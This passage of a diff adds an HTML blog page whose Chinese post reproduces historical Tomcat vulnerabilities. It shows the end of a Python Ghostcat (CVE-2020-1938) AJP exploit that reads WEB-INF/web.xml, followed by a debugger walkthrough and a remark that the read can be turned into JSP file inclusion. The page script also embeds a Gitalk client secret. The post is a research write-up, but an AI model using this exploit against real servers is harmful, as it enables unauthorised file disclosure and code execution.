class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8009</span>, <span class="built_in">help</span>=<span class="string">&quot;AJP port to attack (default is 8009)&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;WEB-INF/web.xml&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;file path :(WEB-INF/web.xml)&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_,data = t.perform_request(<span class="string">&#x27;/asdf&#x27;</span>,attributes=[</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.request_uri&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.path_info&#x27;</span>,args.file]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;req_attribute&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:[<span class="string">&#x27;javax.servlet.include.servlet_path&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]&#125;,</span><br><span class="line">    ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([d.data.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>继续远程调试tomcat</p>
+<p>在AbstractAjpProcessor的prepareRequest()打断点</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415105123002.png" alt="image-20260415105123002"></p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415105148662.png" alt="image-20260415105148662"></p>
+<p>在这个request.setAttribute里面共设置了3个参数值</p>
+<p><code>javax.servlet.include.request_uri</code>  &#x2F;</p>
+<p><code>javax.servlet.include.path_info </code> WEB-INF&#x2F;web.xml</p>
+<p><code>javax.servlet.include.servlet_path</code> &#x2F;</p>
+<p>这里设置3个参数值 使得后续tomcat会去请求响应相应资源并返回</p>
+<p>此时request的参数已经设置好了</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415105510432.png" alt="image-20260415105510432"></p>
+<p>来到service这里 调用adapter的service</p>
+<p>之后又会进入DefaultServlet的doGet处</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415105543563.png" alt="image-20260415105543563"></p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415110341034.png" alt="image-20260415110341034"></p>
+<p>跟进getRelativePath</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415110537635.png" alt="image-20260415110537635"></p>
+<p>根据之前的参数值 最终返回了请求路径&#x2F;WEB-INF&#x2F;web.xml</p>
+<p>之后就是返回路径中的内容了</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415112844350.png" alt="image-20260415112844350"></p>
+<p>脚本里面请求路径改成&#x2F;asdf.jsp即可实现文件包含 此时对应的Servlet就会是jspServlet去处理请求的资源 会解析文件内容为jsp</p>
+<p><img src="E:\blog_back\source_posts\tomcat历史漏洞复现\image-20260415113016013.png" alt="image-20260415113016013"></p>
+<p>http的Process遇到&#x2F;WEB-INF会自动检测到 如何不返回内容</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag" title="CVE">CVE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java/" rel="tag" title="java">java</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag" title="知识">知识</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap left">
+        
+          
+          
+            <img data-src="/covers/44819874_p0.png" data-sizes="auto" alt="URLDNS链" class="lazyload">
+          
+        
+        <a href="/2026/03/26/URLDNS%E9%93%BE/" aria-label="前一篇: URLDNS链" title="前一篇: URLDNS链"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            URLDNS链
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        <img data-src="/covers/16347313_p0.jpg" data-sizes="auto" alt="CC链" class="lazyload">
+      
+      <a href="/2026/03/20/CC%E9%93%BE/" aria-label="后一篇: CC链"  title="后一篇: CC链"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          CC链
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="gitalk">
+              <span>gitalk</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment gitalk-comment" data-aos="fade-up"
+          id="gitalk-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2025-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      S@Ku_yA
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        71.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:25
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">历史漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-12615-PUT-%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">CVE-2017-12615 (PUT 方法任意文件上传)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#manager%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8Fwar%E5%8C%85%E4%B8%8A%E4%BC%A0rce"><span class="toc-number">3.</span> <span class="toc-text">manager弱口令导致任意war包上传rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1938-webapp-ROOT%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.</span> <span class="toc-text">CVE 2020-1938 (webapp&#x2F;ROOT下的任意文件读取)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">复现</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">43</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "S@Ku_yA",
+          title: "tomcat历史漏洞复现",
+          url: "http://example.com/2026/03/20/tomcat%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "历史漏洞复现CVE-2017-12615 (PUT 方法任意文件上传)在tomcat的conf&amp;#x2F;web.xml里面有一个参数readonly 根据注释可以知道这个参数就是开启是否接受delete和put请求 false就等于允许  我们在DefaultServlet中添加这个参数  复现本地启动tomcat 使用jpda这个javaagent 使得idea可以远程调试tomcat 1catalina.bat jpda start   在idea中打断点  bp发包  可以看到idea停",
+          date: "Fri Mar 20 2026 17:33:37 GMT+0800",
+          updated: "Tue May 12 2026 15:38:47 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["gitalk"];
+  var commentConfig = {
+    
+    
+    
+    
+    gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: 'Ov23li1mTMN9Ccjmkh5p',
+            clientSecret: 'ea6c17281ea880a0862ad92a2aec900906d054f0',
+            repo: 'my_blog',
+            owner: 'sakuya-sys',
+            admin: ["sakuya-sys"],
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
